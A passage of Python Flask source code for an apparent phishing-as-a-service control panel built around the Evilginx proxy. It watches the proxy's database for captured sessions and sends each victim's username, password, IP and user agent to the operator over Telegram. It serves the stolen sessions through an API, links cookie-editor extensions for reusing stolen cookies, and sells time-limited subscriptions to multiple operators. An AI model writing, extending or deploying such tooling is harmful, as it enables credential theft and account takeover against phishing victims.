#!/usr/bin/env python3
"""
Flask Admin Interface for Evilginx Monitor
Complete monitoring and notification system with authentication
"""

from flask import Flask, render_template, jsonify, request, session, redirect, url_for
from flask_cors import CORS
from functools import wraps
import json
import os
from pathlib import Path
from datetime import datetime
import threading
import time
from werkzeug.security import generate_password_hash, check_password_hash

# Import notification modules
from notifications import send_telegram_notification, send_discord_notification, send_email_notification
from database_reader import read_latest_session, get_all_sessions
from session_processor import create_txt_file, format_session_message, process_all_tokens

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SESSION_PERMANENT'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = 86400  # 24 hours
CORS(app, supports_credentials=True)

# Configuration paths
CONFIG_DIR = Path.home() / ".evilginx_monitor"
CONFIG_FILE = CONFIG_DIR / "config.json"
AUTH_FILE = CONFIG_DIR / "auth.json"

# Default database path (fallback only - can be configured via Super Admin UI)
# The actual database path is stored in config.json and can be set in the web interface
DEFAULT_DB_PATH = os.path.normpath("/opt/evilginx/data.db")

# Monitoring state
monitoring_status = {
    "active": False,
    "last_check": None,
    "process_id": None,
    "last_session_id": 0
}

# Processed sessions tracking
processed_sessions = {}
session_message_map = {}

# Helper functions
def escape_markdownv2(text):
    """Escape special characters for Telegram MarkdownV2 (only for text outside backticks)"""
    if not text:
        return ""
    # Characters that need escaping in MarkdownV2
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    result = str(text)
    for char in special_chars:
        result = result.replace(char, f'\\{char}')
    return result

def sanitize_unicode_for_console(text):
    """Replace problematic Unicode characters with ASCII equivalents for Windows console"""
    if not text:
        return ""
    text = str(text)
    # Replace common Unicode emojis with ASCII equivalents
    replacements = {
        '\u274c': '[X]',  # ❌
        '\u2705': '[OK]',  # ✅
        '\u26a0\ufe0f': '[!]',  # ⚠️
        '\u2192': '->',  # →
        '\u2714': '[OK]',  # ✔
        '\u2716': '[X]',  # ✖
        '\u26a0': '[!]',  # ⚠
    }
    for unicode_char, ascii_replacement in replacements.items():
        text = text.replace(unicode_char, ascii_replacement)
    return text

def safe_print(message):
    """Print message with Unicode sanitization for Windows console compatibility"""
    try:
        print(sanitize_unicode_for_console(message))
    except UnicodeEncodeError:
        # Fallback: encode with errors='replace'
        print(message.encode('ascii', errors='replace').decode('ascii'))

def load_config():
    """Load configuration from JSON file"""
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {}

def save_config(config):
    """Save configuration to JSON file"""
    try:
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving config: {e}")
        return False

def load_auth():
    """Load authentication data - supports multiple users with roles"""
    if AUTH_FILE.exists():
        try:
            with open(AUTH_FILE, 'r') as f:
                data = json.load(f)
                # Support both old format (single user) and new format (users list)
                if isinstance(data, dict) and 'users' in data:
                    return data
                elif isinstance(data, dict) and 'username' in data:
                    # Migrate old format to new format
                    return {
                        "users": [{
                            "username": data.get("username", "admin"),
                            "password": data.get("password", generate_password_hash("admin123")),
                            "role": "super_admin"
                        }]
                    }
                return data
        except:
            pass
    
    # Create default auth with super_admin
    default_auth = {
        "users": [{
            "username": "admin",
            "password": generate_password_hash("admin123"),
            "role": "super_admin"
        }]
    }
    save_auth(default_auth)
    return default_auth

def get_user_by_username(username):
    """Get user by username from auth data"""
    auth_data = load_auth()
    users = auth_data.get("users", [])
    for user in users:
        if user.get("username") == username:
            return user
    return None

def save_auth(auth_data):
    """Save authentication data"""
    try:
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        with open(AUTH_FILE, 'w') as f:
            json.dump(auth_data, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving auth: {e}")
        return False

def login_required(f):
    """Decorator to require login with IP checking for normal admins"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            if request.path.startswith('/api/'):
                return jsonify({"status": "error", "message": "Not authenticated"}), 401
            return redirect(url_for('login'))
        
        # Check IP access for normal admins (super admins bypass IP check)
        username = session.get('username')
        role = session.get('role')
        
        if role != 'super_admin':
            client_ip = get_client_ip()
            allowed, message = check_ip_access(username, client_ip)
            
            if not allowed:
                # Check if account is locked
                auth_data = load_auth()
                users = auth_data.get('users', [])
                user = next((u for u in users if u.get('username') == username), None)
                
                if user and user.get('account_locked', False):
                    session['account_locked'] = True
                    session.clear()  # Clear session on lockout
                    if request.path.startswith('/api/'):
                        return jsonify({
                            "status": "error", 
                            "message": message,
                            "account_locked": True
                        }), 403
                    return redirect(url_for('login', error=message))
                else:
                    if request.path.startswith('/api/'):
                        return jsonify({
                            "status": "error", 
                            "message": message,
                            "account_locked": False
                        }), 403
                    return redirect(url_for('login', error=message))
        
        return f(*args, **kwargs)
    return decorated_function

def super_admin_required(f):
    """Decorator to require super_admin role"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            if request.path.startswith('/api/'):
                return jsonify({"status": "error", "message": "Not authenticated"}), 401
            return redirect(url_for('login'))
        if session.get('role') != 'super_admin':
            if request.path.startswith('/api/'):
                return jsonify({"status": "error", "message": "Super admin access required"}), 403
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

def get_client_ip():
    """Get client IP address from request"""
    if request.headers.get('X-Forwarded-For'):
        # Get first IP from X-Forwarded-For header
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def send_ip_warning_notification(username, client_ip, attempt_number, account_locked=False):
    """Send Telegram notification for IP access warnings"""
    try:
        config = load_config()
        
        # Check if Telegram notifications are enabled
        if not config.get("telegram_enable") or not config.get("telegram_token"):
            return
        
        # Get Telegram chat ID (use user's personal chat_id if available, otherwise global)
        telegram_chatid = config.get("telegr_chatid")
        if not telegram_chatid:
            return
        
        # Get customizable message templates (with proper MarkdownV2 escaping)
        if attempt_number == 1:
            message_template = config.get("ip_warning_first", 
                "⚠️ *First Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your first warning\\. Please use an authorized IP address\\.\n\nRemaining attempts: *2*")
        elif attempt_number == 2:
            message_template = config.get("ip_warning_second",
                "🔴 *Second Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your second warning\\. One more unauthorized attempt will result in account lockout\\.\n\nRemaining attempts: *1*")
        else:  # account_locked = True
            message_template = config.get("ip_warning_locked",
                "🚫 *Account Locked*\n\nYour account has been locked due to unauthorized IP access attempts\\.\n\nUser: *{username}*\nUnauthorized IP: `{ip}`\n\nYour account has been locked after 3 unauthorized IP access attempts\\. Please contact support to restore access\\.")
        
        # Format message (escape username for MarkdownV2, IP is already in backticks in template)
        message = message_template.replace("{username}", escape_markdownv2(username))
        message = message.replace("{ip}", client_ip)  # IP is already in backticks in template, no need to escape
        
        # Get support Telegram if available
        support_telegram = config.get("support_telegram")
        
        # For locked accounts, use "Contact Admin" button text
        support_button_text = None
        if account_locked and support_telegram:
            support_button_text = "👤 Contact Admin"
        
        # Send notification
        # For locked accounts, always include support_telegram if configured
        from notifications import send_telegram_notification
        result = send_telegram_notification(
            chat_id=telegram_chatid,
            token=config.get("telegram_token"),
            message=message,
            support_telegram=support_telegram,  # Will add button if support_telegram is configured
            support_button_text=support_button_text  # Custom button text for locked accounts
        )
        
        if result:
            safe_print(f"[IP WARNING] Notification sent for {username} - Attempt {attempt_number}")
        else:
            safe_print(f"[IP WARNING] Failed to send notification for {username}")
            
    except Exception as e:
        safe_print(f"[IP WARNING] Error sending notification: {e}")

def check_ip_access(username, client_ip):
    """Check if IP is allowed for user and track failed attempts"""
    auth_data = load_auth()
    users = auth_data.get('users', [])
    
    # Find user
    user = None
    for u in users:
        if u.get('username') == username:
            user = u
            break
    
    if not user:
        return False, "User not found"
    
    # Super admins have no IP restrictions
    if user.get('role') == 'super_admin':
        return True, "Super admin - no IP restriction"
    
    # Check if account is locked
    if user.get('account_locked', False):
        return False, "Account locked due to unauthorized IP access. Please contact support."
    
    # Get allowed IPs for user
    allowed_ips = user.get('allowed_ips', [])
    
    # If no IPs configured, allow all (backward compatibility)
    if not allowed_ips or len(allowed_ips) == 0:
        return True, "No IP restrictions configured"
    
    # Check if current IP is allowed
    if client_ip in allowed_ips:
        # Reset failed attempts on successful access
        if 'failed_ip_attempts' in user:
            user['failed_ip_attempts'] = {}
        save_auth(auth_data)
        return True, "IP allowed"
    
    # IP not allowed - track failed attempt
    failed_attempts = user.get('failed_ip_attempts', {})
    failed_attempts[client_ip] = failed_attempts.get(client_ip, 0) + 1
    attempt_count = failed_attempts[client_ip]
    user['failed_ip_attempts'] = failed_attempts
    
    # Lock account after 3 failed attempts from unauthorized IP
    if attempt_count >= 3:
        user['account_locked'] = True
        user['lock_reason'] = f"Account locked after 3 unauthorized IP access attempts from {client_ip}"
        user['locked_at'] = datetime.now().isoformat()
        save_auth(auth_data)
        
        # Send final notification (account locked)
        send_ip_warning_notification(username, client_ip, 3, account_locked=True)
        
        return False, "Account locked after 3 unauthorized IP access attempts. Please contact support to restore access."
    
    # Send warning notification based on attempt number
    if attempt_count == 1:
        send_ip_warning_notification(username, client_ip, 1)
    elif attempt_count == 2:
        send_ip_warning_notification(username, client_ip, 2)
    
    save_auth(auth_data)
    remaining = 3 - attempt_count
    return False, f"Unauthorized IP address. {remaining} attempt(s) remaining before account lockout."

def ip_check_required(f):
    """Decorator to check IP access for normal admins"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('logged_in'):
            username = session.get('username')
            client_ip = get_client_ip()
            allowed, message = check_ip_access(username, client_ip)
            
            if not allowed:
                if request.path.startswith('/api/'):
                    return jsonify({
                        "status": "error", 
                        "message": message,
                        "account_locked": session.get('account_locked', False)
                    }), 403
                else:
                    # Clear session and redirect to login with message
                    session.clear()
                    return redirect(url_for('login', error=message))
        
        return f(*args, **kwargs)
    return decorated_function

def monitor_database():
    """Background thread to monitor database for new sessions"""
    global monitoring_status, processed_sessions
    
    config = load_config()
    db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
    
    print(f"[MONITORING] Started monitoring database: {db_path}")
    print(f"[MONITORING] Processed sessions count: {len(processed_sessions)}")
    
    while monitoring_status["active"]:
        try:
            # Read latest session
            latest_session = read_latest_session(db_path)
            
            if latest_session and latest_session.get("id", 0) != 0:
                session_id = str(latest_session.get("id", 0))
                
                # Check if this is a new session
                if session_id not in processed_sessions:
                    print(f"[MONITORING] 🆕 New session detected! ID: {session_id}")
                    print(f"[MONITORING] Session details: username={latest_session.get('username', 'N/A')}, remote_addr={latest_session.get('remote_addr', 'N/A')}")
                    
                    processed_sessions[session_id] = True
                    monitoring_status["last_check"] = datetime.now().isoformat()
                    monitoring_status["last_session_id"] = latest_session.get("id", 0)
                    
                    # Send notifications
                    print(f"[MONITORING] Calling send_notifications for session {session_id}...")
                    send_notifications(latest_session)
                    safe_print(f"[MONITORING] [OK] Notification sent for session {session_id}")
                else:
                    # Session already processed, just update check time
                    monitoring_status["last_check"] = datetime.now().isoformat()
            else:
                # No session found or invalid session
                monitoring_status["last_check"] = datetime.now().isoformat()
            
            time.sleep(30)  # Check every 30 seconds
        except Exception as e:
            import traceback
            safe_print(f"[MONITORING] [X] Error: {e}")
            try:
                safe_print(f"[MONITORING] Traceback: {traceback.format_exc()}")
            except:
                print(f"[MONITORING] Traceback: (error printing traceback)")
            time.sleep(30)

def escape_markdownv2(text):
    """Escape special characters for Telegram MarkdownV2"""
    if not text:
        return ""
    # Characters that need escaping in MarkdownV2
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    result = str(text)
    for char in special_chars:
        result = result.replace(char, f'\\{char}')
    return result

def send_notifications(session_data):
    """Send notifications for a new session"""
    import traceback
    
    try:
        config = load_config()
        print(f"[NOTIFICATIONS] Starting notification for session ID: {session_data.get('id', 0)}")
        
        # No TXT file needed - just send message template
        txt_file_path = None
        
        # Get notification template from config or use default
        notification_template = config.get("notification_incoming_cookie", 
            "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━")
        
        # Format message using template with placeholders
        from datetime import datetime
        session_id = session_data.get("id", 0)
        username = session_data.get("username", "N/A")
        password = session_data.get("password", "N/A")
        remote_addr = session_data.get("remote_addr", "N/A")
        useragent = session_data.get("useragent", "N/A")
        create_time = session_data.get("create_time", 0)
        
        # Format timestamp
        if create_time:
            try:
                time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
            except:
                time_str = str(create_time)
        else:
            time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Replace placeholders in template (escape values for MarkdownV2)
        message = notification_template.replace("{session_id}", escape_markdownv2(str(session_id)))
        message = message.replace("{username}", escape_markdownv2(username))
        message = message.replace("{password}", escape_markdownv2(password))
        message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
        message = message.replace("{useragent}", escape_markdownv2(useragent))
        message = message.replace("{time}", escape_markdownv2(time_str))
        
        # Check Telegram configuration
        telegram_enable = config.get("telegram_enable", False)
        telegram_token = config.get("telegram_token")
        telegram_chatid = config.get("telegr_chatid")
        
        print(f"[NOTIFICATIONS] Telegram config check:")
        print(f"  - telegram_enable: {telegram_enable}")
        print(f"  - telegram_token: {'SET' if telegram_token else 'NOT SET'}")
        print(f"  - telegram_chatid: {'SET' if telegram_chatid else 'NOT SET'}")
        
        # Send Telegram
        if telegram_enable and telegram_token and telegram_chatid:
            print(f"[NOTIFICATIONS] Attempting to send Telegram notification...")
            try:
                # Get web URL from config or use default
                web_url = config.get("web_url", "http://localhost:5004")
                support_telegram = config.get("support_telegram")
                print(f"[NOTIFICATIONS] Sending to chat_id: {telegram_chatid}, web_url: {web_url}")
                
                print(f"[NOTIFICATIONS] Calling send_telegram_notification with:")
                print(f"  - chat_id: {telegram_chatid}")
                print(f"  - token: {'SET' if telegram_token else 'NOT SET'}")
                print(f"  - message length: {len(message)} chars")
                print(f"  - session_id: {session_id}")
                print(f"  - web_url: {web_url}")
                
                # Send notification without file attachment - user can check details on UI
                message_id = send_telegram_notification(
                    telegram_chatid,
                    telegram_token,
                    message,
                    file_path=None,  # No file attachment
                    session_id=session_id,
                    web_url=web_url,
                    support_telegram=support_telegram
                )
                
                print(f"[NOTIFICATIONS] send_telegram_notification returned: {message_id}")
                
                if message_id:
                    session_message_map[str(session_id)] = message_id
                    safe_print(f"[NOTIFICATIONS] [OK] Telegram notification sent successfully! Message ID: {message_id}")
                else:
                    safe_print(f"[NOTIFICATIONS] [X] Telegram notification failed - no message ID returned")
                    safe_print(f"[NOTIFICATIONS] This means send_telegram_notification returned None or failed silently")
            except Exception as e:
                safe_print(f"[NOTIFICATIONS] [X] Telegram error: {e}")
                safe_print(f"[NOTIFICATIONS] Traceback: {traceback.format_exc()}")
        else:
            missing = []
            if not telegram_enable:
                missing.append("telegram_enable is False")
            if not telegram_token:
                missing.append("telegram_token is not set")
            if not telegram_chatid:
                missing.append("telegr_chatid is not set")
            safe_print(f"[NOTIFICATIONS] [!] Telegram notification skipped: {', '.join(missing)}")
        
        # Send Discord (without file attachment)
        if config.get("discord_enable") and config.get("discord_token") and config.get("discord_chat_id"):
            try:
                # Note: Discord notification might need file, but we're skipping it for now
                # User can check details on UI page
                print(f"[NOTIFICATIONS] Discord notification skipped (no file attachment)")
            except Exception as e:
                print(f"Discord error: {e}")
        
        # Send Email (without file attachment)
        if config.get("mail_enable") and config.get("mail_host") and config.get("mail_user"):
            try:
                # Note: Email notification might need file, but we're skipping it for now
                # User can check details on UI page
                print(f"[NOTIFICATIONS] Email notification skipped (no file attachment)")
            except Exception as e:
                print(f"Email error: {e}")
        
        safe_print(f"[NOTIFICATIONS] [OK] Function completed for session {session_id}")
        import sys
        sys.stdout.flush()
        
    except Exception as e:
        safe_print(f"[NOTIFICATIONS] [X] CRITICAL ERROR in send_notifications: {e}")
        try:
            safe_print(f"[NOTIFICATIONS] Traceback: {traceback.format_exc()}")
        except:
            print(f"[NOTIFICATIONS] Traceback: (error printing traceback)")
        import sys
        sys.stdout.flush()

# Routes
@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page with role-based authentication and subscription check"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        user = get_user_by_username(username)
        if user and check_password_hash(user.get('password', ''), password):
            # Check subscription status for normal admins
            user_role = user.get('role', 'admin')
            if user_role == 'admin':
                subscription_status = user.get('subscription_status', 'active')
                
                # Check manual status first (overrides date check)
                config = load_config()
                support_telegram = config.get("support_telegram", "")
                support_message = ""
                if support_telegram:
                    support_message = f" Contact support on Telegram: @{support_telegram}"
                
                if subscription_status == 'expired':
                    return jsonify({
                        "status": "error", 
                        "message": f"Your subscription has expired. Please contact support for renewal.{support_message}"
                    }), 403
                elif subscription_status == 'suspended':
                    return jsonify({
                        "status": "error", 
                        "message": f"Your account has been suspended. Please contact support.{support_message}"
                    }), 403
                elif subscription_status == 'active':
                    # Status is active, allow login regardless of date
                    pass
                else:
                    # If status not set, check date-based expiration
                    subscription_expires = user.get('subscription_expires')
                    if subscription_expires:
                        from datetime import datetime
                        try:
                            expires_date = datetime.fromisoformat(subscription_expires)
                            if datetime.now() > expires_date:
                                return jsonify({
                                    "status": "error", 
                                    "message": "Your subscription has expired. Please contact support for renewal."
                                }), 403
                        except:
                            pass  # Invalid date format, allow login
            
            # Check IP access for normal admins (super admins bypass IP check)
            if user_role != 'super_admin':
                client_ip = get_client_ip()
                allowed, message = check_ip_access(username, client_ip)
                
                if not allowed:
                    # Check if account is locked
                    if user.get('account_locked', False):
                        config = load_config()
                        support_telegram = config.get("support_telegram", "")
                        support_msg = f" Contact support on Telegram: @{support_telegram}" if support_telegram else ""
                        return jsonify({
                            "status": "error",
                            "message": f"{message}{support_msg}",
                            "account_locked": True
                        }), 403
                    else:
                        return jsonify({
                            "status": "error",
                            "message": message,
                            "account_locked": False
                        }), 403
            
            session['logged_in'] = True
            session['username'] = username
            session['role'] = user_role
            session.permanent = True
            return jsonify({
                "status": "success", 
                "redirect": url_for('index'),
                "role": session['role']
            })
        else:
            return jsonify({"status": "error", "message": "Invalid credentials"}), 401
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logout"""
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    """Main dashboard page"""
    # Pass user role to template
    return render_template('index.html', user_role=session.get('role', 'admin'))

@app.route('/api/user/role', methods=['GET'])
@login_required
def get_user_role():
    """Get current user's role and subscription info"""
    user = get_user_by_username(session.get('username', ''))
    subscription_expires = None
    subscription_status = None
    is_expired = False
    if user and user.get('role') == 'admin':
        subscription_status = user.get('subscription_status', 'active')
        subscription_expires = user.get('subscription_expires')
        
        # Check if expired based on status or date
        if subscription_status == 'expired':
            is_expired = True
        elif subscription_status == 'suspended':
            is_expired = True  # Suspended also blocks access
        elif subscription_expires:
            from datetime import datetime
            try:
                expires_date = datetime.fromisoformat(subscription_expires)
                is_expired = datetime.now() > expires_date
            except:
                pass
    
    return jsonify({
        "role": session.get('role', 'admin'),
        "username": session.get('username', ''),
        "subscription_expires": subscription_expires,
        "subscription_status": subscription_status,
        "subscription_expired": is_expired
    })

@app.route('/api/config', methods=['GET'])
@super_admin_required
def get_config():
    """Get current configuration (super admin only)"""
    config = load_config()
    # Mask sensitive data for display
    if 'telegram_token' in config:
        config['telegram_token'] = mask_string(config['telegram_token'])
    if 'discord_token' in config:
        config['discord_token'] = mask_string(config['discord_token'])
    if 'mail_password' in config:
        config['mail_password'] = mask_string(config['mail_password'])
    return jsonify(config)

@app.route('/api/extension-urls', methods=['GET'])
@login_required
def get_extension_urls():
    """Get extension URLs (accessible to all logged-in users)"""
    config = load_config()
    return jsonify({
        'cookie_editor_chrome_url': config.get('cookie_editor_chrome_url', 'https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm'),
        'cookie_editor_firefox_url': config.get('cookie_editor_firefox_url', 'https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/'),
        'editthiscookie_chrome_url': config.get('editthiscookie_chrome_url', 'https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg'),
        'editthiscookie_firefox_url': config.get('editthiscookie_firefox_url', 'https://addons.mozilla.org/en-US/firefox/addon/edit-this-cookie/')
    })

def mask_string(s, visible=4):
    """Mask string showing only first few characters"""
    if not s or len(s) <= visible:
        return "*" * len(s) if s else ""
    return s[:visible] + "*" * (len(s) - visible)

@app.route('/api/config', methods=['POST'])
@super_admin_required
def update_config():
    """Update configuration"""
    try:
        data = request.json
        config = load_config()
        config.update(data)
        if save_config(config):
            return jsonify({"status": "success", "message": "Configuration updated"})
        else:
            return jsonify({"status": "error", "message": "Failed to save configuration"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/status', methods=['GET'])
@login_required
def get_status():
    """Get system status"""
    config = load_config()
    is_monitoring = monitoring_status["active"]
    user_role = session.get('role', 'admin')
    
    # For normal admins, only show enabled notifications
    # For super admins, show all notifications
    status = {
        "monitoring": is_monitoring,
        "db_file_path": config.get("dbfile_path", DEFAULT_DB_PATH),
        "last_check": monitoring_status.get("last_check"),
        "processed_sessions": len(processed_sessions)
    }
    
    # Add notification status
    telegram_enabled = config.get("telegram_enable", False)
    discord_enabled = config.get("discord_enable", False)
    email_enabled = config.get("mail_enable", False)
    
    # Normal admins only see enabled notifications
    if user_role == 'super_admin':
        status["telegram"] = {
            "enabled": telegram_enabled,
            "configured": bool(config.get("telegram_token") and config.get("telegr_chatid"))
        }
        status["discord"] = {
            "enabled": discord_enabled,
            "configured": bool(config.get("discord_token") and config.get("discord_chat_id"))
        }
        status["email"] = {
            "enabled": email_enabled,
            "configured": bool(config.get("mail_host") and config.get("mail_user") and config.get("to_mail"))
        }
    else:
        # Normal admin: only show if enabled
        if telegram_enabled:
            status["telegram"] = {
                "enabled": True,
                "configured": bool(config.get("telegram_token") and config.get("telegr_chatid"))
            }
        if discord_enabled:
            status["discord"] = {
                "enabled": True,
                "configured": bool(config.get("discord_token") and config.get("discord_chat_id"))
            }
        if email_enabled:
            status["email"] = {
                "enabled": True,
                "configured": bool(config.get("mail_host") and config.get("mail_user") and config.get("to_mail"))
            }
    return jsonify(status)

@app.route('/api/sessions', methods=['GET'])
@login_required
def get_sessions():
    """Get recent sessions"""
    try:
        config = load_config()
        db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
        # Clean up path
        db_path = str(db_path).strip()
        db_path = os.path.normpath(db_path)
        
        print(f"[SESSIONS] Database path: {db_path}")
        print(f"[SESSIONS] File exists: {os.path.exists(db_path)}")
        
        # Get limit from query parameter
        limit_param = request.args.get('limit', '100')
        refresh = request.args.get('refresh', 'false').lower() == 'true'
        
        try:
            if limit_param == 'all' or refresh:
                limit = 10000
            else:
                limit = int(limit_param)
        except ValueError:
            limit = 100
        
        if not os.path.exists(db_path):
            print(f"[SESSIONS] ERROR: Database file not found!")
            return jsonify({
                "sessions": [],
                "count": 0,
                "total_loaded": 0,
                "error": f"Database file not found at: {db_path}",
                "db_path": db_path,
                "file_exists": False
            }), 200  # Return 200 with error message, not 404
        
        print(f"[SESSIONS] Reading sessions with limit: {limit}")
        sessions = get_all_sessions(db_path, limit=limit)
        print(f"[SESSIONS] Found {len(sessions)} sessions")
        if len(sessions) > 0:
            print(f"[SESSIONS] First session ID: {sessions[0].get('id')}")
            print(f"[SESSIONS] Sample session keys: {list(sessions[0].keys())}")
        else:
            print(f"[SESSIONS] WARNING: No sessions found in database!")
            print(f"[SESSIONS] This might mean:")
            print(f"[SESSIONS]   1. Database file is empty")
            print(f"[SESSIONS]   2. Database format is incorrect")
            print(f"[SESSIONS]   3. Parser is not finding sessions")
        
        response = jsonify({
            "sessions": sessions,
            "count": len(sessions),
            "total_loaded": len(sessions),
            "db_path": db_path,
            "file_exists": True
        })
        print(f"[SESSIONS] Returning response with {len(sessions)} sessions")
        return response
    except Exception as e:
        print(f"[SESSIONS] Exception: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({
            "sessions": [],
            "count": 0,
            "error": str(e)
        }), 500

@app.route('/api/monitoring/start', methods=['POST'])
@login_required
def start_monitoring():
    """Start monitoring"""
    try:
        config = load_config()
        db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
        
        if not db_path:
            return jsonify({"status": "error", "message": "Database file path not configured"}), 400
        
        if monitoring_status["active"]:
            return jsonify({"status": "error", "message": "Monitoring already running"}), 400
        
        # Start monitoring thread
        monitoring_status["active"] = True
        monitoring_status["last_check"] = datetime.now().isoformat()
        
        monitor_thread = threading.Thread(target=monitor_database, daemon=True)
        monitor_thread.start()
        
        return jsonify({"status": "success", "message": "Monitoring started"})
            
    except Exception as e:
        monitoring_status["active"] = False
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/monitoring/stop', methods=['POST'])
@login_required
def stop_monitoring():
    """Stop monitoring"""
    try:
        monitoring_status["active"] = False
        return jsonify({"status": "success", "message": "Monitoring stopped"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/database-viewer')
@super_admin_required
def database_viewer():
    """Database viewer page to inspect raw database data"""
    return render_template('database_viewer.html')

@app.route('/manage-admins')
@super_admin_required
def manage_admins():
    """Admin management page"""
    return render_template('manage_admins.html')

@app.route('/notifications')
@super_admin_required
def notifications():
    """Notification management page"""
    return render_template('notifications.html')

@app.route('/api/admins', methods=['GET'])
@super_admin_required
def get_all_admins():
    """Get all admin users"""
    auth_data = load_auth()
    users = auth_data.get("users", [])
    # Remove password from response
    admin_list = []
    for user in users:
        admin_info = {
            "username": user.get("username"),
            "role": user.get("role", "admin"),
            "subscription_expires": user.get("subscription_expires"),
            "subscription_status": user.get("subscription_status", "active"),
            "created_at": user.get("created_at")
        }
        admin_list.append(admin_info)
    return jsonify({"admins": admin_list})

@app.route('/api/admins', methods=['POST'])
@super_admin_required
def create_admin():
    """Create a new admin user"""
    try:
        data = request.json
        username = data.get('username')
        password = data.get('password')
        subscription_days = int(data.get('subscription_days', 30))  # Default 30 days
        
        if not username or not password:
            return jsonify({"status": "error", "message": "Username and password are required"}), 400
        
        auth_data = load_auth()
        users = auth_data.get("users", [])
        
        # Check if username already exists
        if any(u.get('username') == username for u in users):
            return jsonify({"status": "error", "message": "Username already exists"}), 400
        
        # Calculate subscription expiration date
        from datetime import datetime, timedelta
        expires_date = datetime.now() + timedelta(days=subscription_days)
        
        # Create new admin user
        new_user = {
            "username": username,
            "password": generate_password_hash(password),
            "role": "admin",
            "subscription_expires": expires_date.isoformat(),
            "subscription_status": "active",  # Default to active
            "created_at": datetime.now().isoformat()
        }
        
        users.append(new_user)
        auth_data["users"] = users
        
        if save_auth(auth_data):
            return jsonify({"status": "success", "message": "Admin user created successfully"})
        else:
            return jsonify({"status": "error", "message": "Failed to save user"}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/admins/<username>', methods=['PUT'])
@super_admin_required
def update_admin(username):
    """Update admin user subscription"""
    try:
        data = request.json
        subscription_days = data.get('subscription_days')
        subscription_status = data.get('subscription_status')
        
        auth_data = load_auth()
        users = auth_data.get("users", [])
        
        user_found = False
        old_status = None
        old_expires = None
        updated_user = None
        days_added = None
        for user in users:
            if user.get('username') == username:
                user_found = True
                old_status = user.get('subscription_status', 'active')
                old_expires = user.get('subscription_expires')
                updated_user = user  # Keep reference to the user
                
                if subscription_days is not None:
                    from datetime import datetime, timedelta
                    # Calculate new expiry date
                    if old_expires:
                        try:
                            old_date = datetime.fromisoformat(old_expires)
                            # If old date is in the future, extend from there, otherwise from now
                            if old_date > datetime.now():
                                expires_date = old_date + timedelta(days=int(subscription_days))
                                # Calculate days added
                                days_added = int(subscription_days)
                            else:
                                expires_date = datetime.now() + timedelta(days=int(subscription_days))
                                # Calculate days added from now
                                days_added = int(subscription_days)
                        except:
                            expires_date = datetime.now() + timedelta(days=int(subscription_days))
                            days_added = int(subscription_days)
                    else:
                        expires_date = datetime.now() + timedelta(days=int(subscription_days))
                        days_added = int(subscription_days)
                    
                    user['subscription_expires'] = expires_date.isoformat()
                
                if subscription_status is not None:
                    # Validate status
                    if subscription_status in ['active', 'suspended', 'expired']:
                        user['subscription_status'] = subscription_status
                        # If setting to active, ensure it continues (don't change date)
                        if subscription_status == 'active':
                            # Keep existing expiration date, just activate
                            pass
                    else:
                        return jsonify({"status": "error", "message": "Invalid subscription status"}), 400
                break
        
        if not user_found:
            return jsonify({"status": "error", "message": "User not found"}), 404
        
        auth_data["users"] = users
        if save_auth(auth_data):
            try:
                config = load_config()
                if config.get("telegram_enable") and config.get("telegram_token") and config.get("telegr_chatid"):
                    support_telegram = config.get("support_telegram")
                    
                    # Send notification if subscription was extended
                    if subscription_days is not None and days_added is not None and days_added > 0 and updated_user:
                        try:
                            safe_print(f"[DEBUG] Sending extension notification: days_added={days_added}, username={username}, subscription_days={subscription_days}")
                            extension_template = config.get("notification_account_extension", 
